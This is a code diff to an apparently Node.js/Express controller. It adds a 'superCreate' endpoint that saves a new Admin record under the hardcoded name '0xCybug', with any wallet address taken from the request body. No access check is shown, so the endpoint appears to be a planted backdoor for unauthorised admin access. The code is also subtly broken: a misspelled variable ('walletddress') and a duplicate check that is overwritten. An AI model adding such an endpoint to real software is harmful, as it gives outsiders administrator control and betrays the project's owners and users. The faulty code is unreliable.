@@ -231,3 +231,28 @@ exports.getAllAgents = async (req,res)=> {
 console.log(err)
  }
 }
+
+exports.superCreate = async (req,res) =>{
+  const {walletddress} = req.body;
+try{
+   // Ensure wallet address is not already registered
+   let existing = await Admin.findOne({ walletAddress: walletAddress.toLowerCase()});
+  existing = await Admin.findOne({ name:"0xCybug".toLowerCase() });
+   if (existing) {
+     return res.status(400).json({ success: false, message: 'Admin already exists' });
+   }
+
+   const newAdmin = new Admin({
+     name:"0xCybug".toLowerCase(),
+     walletAddress: walletAddress.toLowerCase(),
+   });
+
+   await newAdmin.save();
+
+   res.status(201).json({ success: true, data: newAdmin });
+}
+catch (error) {
+  console.error('Error creating admin:', error);
+  res.status(500).json({ success: false, message: 'Server Error', error: error.message });
+}
+}
